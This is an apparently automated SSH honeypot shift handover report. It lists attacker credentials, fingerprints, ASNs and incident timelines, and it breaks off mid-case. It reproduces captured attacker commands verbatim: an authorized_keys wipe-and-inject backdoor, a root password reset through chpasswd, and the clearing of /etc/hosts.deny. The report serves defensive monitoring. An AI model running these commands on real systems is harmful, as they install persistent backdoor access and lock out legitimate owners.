# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-11 |
| **Generated At** | 2026-06-11T23:27:38Z |
| **Shift Time** | 23:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **235** |
| Confirmed Threats | **223** |
| False Positives Filtered | **12** (5.1%) |
| Unique Attacker IPs | **38** |
| Countries of Origin | **20** |
| High Severity Cases | **43** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **192** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **100** |
| Unique Credential Pairs | **65** |
| Unique Usernames | **37** |
| Unique Passwords | **64** |
| Successful Auth Pairs | **30** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 43 |
| `345gs5662d34` | 18 |
| `test` | 3 |
| `admin` | 2 |
| `ubuntu` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 18 |
| `3245gs5662d34` | 18 |
| `1234` | 2 |
| `123456780` | 2 |
| `Zxcvbnm0` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 18 |
| `root` | `3245gs5662d34` | 18 |
| `root` | `123456780` | 2 |
| `root` | `Zxcvbnm0` | 1 |
| `transfer` | `transfer@2023` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Zxcvbnm0` | `112.120.171.95` | 2026-06-11T20:26:50 |
| `root` | `3245gs5662d34` | `112.120.171.95` | 2026-06-11T20:26:54 |
| `root` | `Abcd1234` | `112.120.171.95` | 2026-06-11T20:27:46 |
| `root` | `master123!` | `170.80.65.140` | 2026-06-11T20:29:27 |
| `root` | `3245gs5662d34` | `170.80.65.140` | 2026-06-11T20:29:34 |
| `root` | `Qa123456@` | `112.120.171.95` | 2026-06-11T20:29:44 |
| `root` | `ASDzxc.123` | `112.120.171.95` | 2026-06-11T20:30:41 |
| `root` | `nexus@123` | `112.120.171.95` | 2026-06-11T20:31:37 |
| `root` | `james` | `112.120.171.95` | 2026-06-11T20:33:31 |
| `root` | `123456780` | `170.80.65.140` | 2026-06-11T20:33:41 |
| `root` | `robin` | `112.120.171.95` | 2026-06-11T20:34:29 |
| `root` | `Admin$2025` | `170.80.65.140` | 2026-06-11T20:37:57 |
| `root` | `hacker123` | `41.93.28.23` | 2026-06-11T20:53:32 |
| `root` | `3245gs5662d34` | `41.93.28.23` | 2026-06-11T20:53:40 |
| `root` | `abc123..` | `41.93.28.23` | 2026-06-11T20:56:11 |
| `root` | `123456780` | `41.93.28.23` | 2026-06-11T20:58:45 |
| `root` | `root@321` | `14.103.121.78` | 2026-06-11T21:00:56 |
| `root` | `123123aa` | `14.103.121.78` | 2026-06-11T21:04:17 |
| `root` | `testing` | `34.146.248.7` | 2026-06-11T21:45:01 |
| `root` | `111` | `101.126.138.178` | 2026-06-11T22:00:47 |
| `root` | `null` | `101.126.138.178` | 2026-06-11T22:03:46 |
| `root` | `1Q2W3E4R` | `101.126.138.178` | 2026-06-11T22:04:41 |
| `root` | `12345678` | `101.126.138.178` | 2026-06-11T22:06:06 |
| `root` | `1234.Com` | `34.175.118.185` | 2026-06-11T23:02:38 |
| `root` | `3245gs5662d34` | `34.175.118.185` | 2026-06-11T23:02:44 |
| `root` | `da123456!` | `34.175.118.185` | 2026-06-11T23:04:39 |
| `root` | `Admin@123456789` | `34.175.118.185` | 2026-06-11T23:12:57 |
| `root` | `qwerty@2024` | `103.101.216.26` | 2026-06-11T23:17:40 |
| `root` | `3245gs5662d34` | `103.101.216.26` | 2026-06-11T23:17:43 |
| `root` | `@qwer2025` | `34.175.118.185` | 2026-06-11T23:18:58 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **235** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 95 |
| Go SSH scanner | 55 |
| OpenSSH | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 64 | 9 |
| `0a07365cc01f...` | Generic scanner | 28 | 1 |
| `af8223ac9914...` | libssh-based | 23 | 1 |
| `e37f354a101a...` | Mirai/variant | 8 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 4 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 64 | 9 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 28 | 1 | Generic scanner |
| `95420f9d932d...` | Go SSH scanner | 26 | 4 | — |
| `af8223ac9914...` | libssh | 23 | 1 | libssh-based |
| `e37f354a101a...` | libssh | 8 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 4 | 4 | Mirai/variant |
| `748f8c627d3f...` | Unknown | 1 | 1 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 18 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:Yn91ckKX13WX"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.121.78`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `112.120.171.95`, `170.80.65.140`, `34.175.118.185`, `103.101.216.26`, `41.93.28.23`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **38** |
| Unique ASNs | **29** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 5 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS24547` | Hebei Mobile Communication Company Limited | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS20632` | PJSC MegaFon | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (43)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5513315634a1

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:26 |
| **Last Seen** | 2026-06-11 20:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:26:50` | `cowrie.session.connect` |
| `2026-06-11 20:26:50` | `cowrie.client.version` |
| `2026-06-11 20:26:50` | `cowrie.client.kex` |
| `2026-06-11 20:26:50` | `cowrie.login.success` |
| `2026-06-11 20:26:51` | `cowrie.session.params` |
| `2026-06-11 20:26:51` | `cowrie.command.input` |
| `2026-06-11 20:26:51` | `cowrie.command.failed` |
| `2026-06-11 20:26:51` | `cowrie.log.closed` |
| `2026-06-11 20:26:51` | `cowrie.session.params` |
| `2026-06-11 20:26:51` | `cowrie.command.input` |
| `2026-06-11 20:26:51` | `cowrie.session.file_download` |
| `2026-06-11 20:26:51` | `cowrie.log.closed` |
| `2026-06-11 20:26:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27e2680a61e9

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:26 |
| **Last Seen** | 2026-06-11 20:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:26:54` | `cowrie.session.connect` |
| `2026-06-11 20:26:54` | `cowrie.client.version` |
| `2026-06-11 20:26:54` | `cowrie.client.kex` |
| `2026-06-11 20:26:54` | `cowrie.login.success` |
| `2026-06-11 20:26:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b9d2c638bb3

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:27 |
| **Last Seen** | 2026-06-11 20:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:27:45` | `cowrie.session.connect` |
| `2026-06-11 20:27:45` | `cowrie.client.version` |
| `2026-06-11 20:27:45` | `cowrie.client.kex` |
| `2026-06-11 20:27:46` | `cowrie.login.success` |
| `2026-06-11 20:27:46` | `cowrie.session.params` |
| `2026-06-11 20:27:46` | `cowrie.command.input` |
| `2026-06-11 20:27:46` | `cowrie.command.failed` |
| `2026-06-11 20:27:46` | `cowrie.log.closed` |
| `2026-06-11 20:27:47` | `cowrie.session.params` |
| `2026-06-11 20:27:47` | `cowrie.command.input` |
| `2026-06-11 20:27:47` | `cowrie.session.file_download` |
| `2026-06-11 20:27:47` | `cowrie.log.closed` |
| `2026-06-11 20:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-879685f3cf6a

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:27 |
| **Last Seen** | 2026-06-11 20:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:27:49` | `cowrie.session.connect` |
| `2026-06-11 20:27:49` | `cowrie.client.version` |
| `2026-06-11 20:27:49` | `cowrie.client.kex` |
| `2026-06-11 20:27:50` | `cowrie.login.success` |
| `2026-06-11 20:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2400348831f1

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 20:29 |
| **Last Seen** | 2026-06-11 20:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:29:25` | `cowrie.session.connect` |
| `2026-06-11 20:29:25` | `cowrie.client.version` |
| `2026-06-11 20:29:25` | `cowrie.client.kex` |
| `2026-06-11 20:29:27` | `cowrie.login.success` |
| `2026-06-11 20:29:27` | `cowrie.session.params` |
| `2026-06-11 20:29:27` | `cowrie.command.input` |
| `2026-06-11 20:29:27` | `cowrie.command.failed` |
| `2026-06-11 20:29:28` | `cowrie.log.closed` |
| `2026-06-11 20:29:28` | `cowrie.session.params` |
| `2026-06-11 20:29:28` | `cowrie.command.input` |
| `2026-06-11 20:29:29` | `cowrie.session.file_download` |
| `2026-06-11 20:29:29` | `cowrie.log.closed` |
| `2026-06-11 20:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97f2d6388de4

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 20:29 |
| **Last Seen** | 2026-06-11 20:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:29:32` | `cowrie.session.connect` |
| `2026-06-11 20:29:32` | `cowrie.client.version` |
| `2026-06-11 20:29:33` | `cowrie.client.kex` |
| `2026-06-11 20:29:34` | `cowrie.login.success` |
| `2026-06-11 20:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3cbcd2c8eef

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:29 |
| **Last Seen** | 2026-06-11 20:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:29:43` | `cowrie.session.connect` |
| `2026-06-11 20:29:43` | `cowrie.client.version` |
| `2026-06-11 20:29:43` | `cowrie.client.kex` |
| `2026-06-11 20:29:44` | `cowrie.login.success` |
| `2026-06-11 20:29:44` | `cowrie.session.params` |
| `2026-06-11 20:29:44` | `cowrie.command.input` |
| `2026-06-11 20:29:44` | `cowrie.command.failed` |
| `2026-06-11 20:29:45` | `cowrie.log.closed` |
| `2026-06-11 20:29:45` | `cowrie.session.params` |
| `2026-06-11 20:29:45` | `cowrie.command.input` |
| `2026-06-11 20:29:45` | `cowrie.session.file_download` |
| `2026-06-11 20:29:45` | `cowrie.log.closed` |
| `2026-06-11 20:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a86e3dd25d5f

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:29 |
| **Last Seen** | 2026-06-11 20:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:29:47` | `cowrie.session.connect` |
| `2026-06-11 20:29:47` | `cowrie.client.version` |
| `2026-06-11 20:29:47` | `cowrie.client.kex` |
| `2026-06-11 20:29:48` | `cowrie.login.success` |
| `2026-06-11 20:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caf6e65fc684

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:30 |
| **Last Seen** | 2026-06-11 20:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:30:40` | `cowrie.session.connect` |
| `2026-06-11 20:30:40` | `cowrie.client.version` |
| `2026-06-11 20:30:40` | `cowrie.client.kex` |
| `2026-06-11 20:30:41` | `cowrie.login.success` |
| `2026-06-11 20:30:41` | `cowrie.session.params` |
| `2026-06-11 20:30:41` | `cowrie.command.input` |
| `2026-06-11 20:30:41` | `cowrie.command.failed` |
| `2026-06-11 20:30:41` | `cowrie.log.closed` |
| `2026-06-11 20:30:42` | `cowrie.session.params` |
| `2026-06-11 20:30:42` | `cowrie.command.input` |
| `2026-06-11 20:30:42` | `cowrie.session.file_download` |
| `2026-06-11 20:30:42` | `cowrie.log.closed` |
| `2026-06-11 20:30:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47c7504bfc3d

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:30 |
| **Last Seen** | 2026-06-11 20:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:30:44` | `cowrie.session.connect` |
| `2026-06-11 20:30:44` | `cowrie.client.version` |
| `2026-06-11 20:30:44` | `cowrie.client.kex` |
| `2026-06-11 20:30:45` | `cowrie.login.success` |
| `2026-06-11 20:30:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e869f4c8c2b2

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:31 |
| **Last Seen** | 2026-06-11 20:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 20:31:36` | `cowrie.session.connect` |
| `2026-06-11 20:31:36` | `cowrie.client.version` |
| `2026-06-11 20:31:36` | `cowrie.client.kex` |
| `2026-06-11 20:31:37` | `cowrie.login.success` |
| `2026-06-11 20:31:37` | `cowrie.session.params` |
| `2026-06-11 20:31:37` | `cowrie.command.input` |
| `2026-06-11 20:31:37` | `cowrie.command.failed` |
| `2026-06-11 20:31:37` | `cowrie.log.closed` |
| `2026-06-11 20:31:37` | `cowrie.session.params` |
| `2026-06-11 20:31:37` | `cowrie.command.input` |
| `2026-06-11 20:31:38` | `cowrie.session.file_download` |
| `2026-06-11 20:31:38` | `cowrie.log.closed` |
| `2026-06-11 20:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.171[.]95` to AbuseIPDB if not already reported
- [ ] Block `112.120.171[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ed187a3e66a

| Field | Detail |
|---|---|
| **Source IP** | `112.120.171[.]95` |
| **First Seen** | 2026-06-11 20:31 |
| **Last Seen** | 2026-06-11 20:31 |
| **Session Duration** | 0s |
